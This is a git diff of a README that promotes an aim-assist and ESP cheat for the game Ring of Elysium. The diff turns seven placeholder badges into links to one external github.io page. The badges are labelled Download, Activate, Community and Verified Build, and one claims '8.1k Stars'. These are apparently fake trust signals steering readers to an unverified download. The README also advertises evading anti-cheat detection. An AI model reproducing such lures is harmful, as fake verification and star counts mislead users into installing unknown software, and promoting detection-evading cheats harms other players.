@@ -21,10 +21,10 @@ This isn’t a one-size-fits-all trainer. You can customize **FOV, smoothness, a
 
 ---
 
-[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](#)
-[![⭐️ 8.1k Stars](https://img.shields.io/badge/GitHub-8.1k_Stars-green?logo=github\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](#)
+[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](https://roe-aim-assist.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](https://roe-aim-assist.github.io/.github/)
+[![⭐️ 8.1k Stars](https://img.shields.io/badge/GitHub-8.1k_Stars-green?logo=github\&style=for-the-badge)](https://roe-aim-assist.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](https://roe-aim-assist.github.io/.github/)
 
 ---
 
@@ -152,8 +152,8 @@ A: It minimizes detection but is never 100% undetectable.
 
 The **Ring of Elysium Aim Assist Tool** delivers **precision targeting, recoil control, and optional ESP awareness** in one streamlined package. Whether you’re sniping across snowy ridges or surviving chaotic close-range duels, it ensures accuracy when it matters most.
 
-[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](#)
-[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](#)
+[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](https://roe-aim-assist.github.io/.github/)
+[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](https://roe-aim-assist.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](https://roe-aim-assist.github.io/.github/)
 
 ---
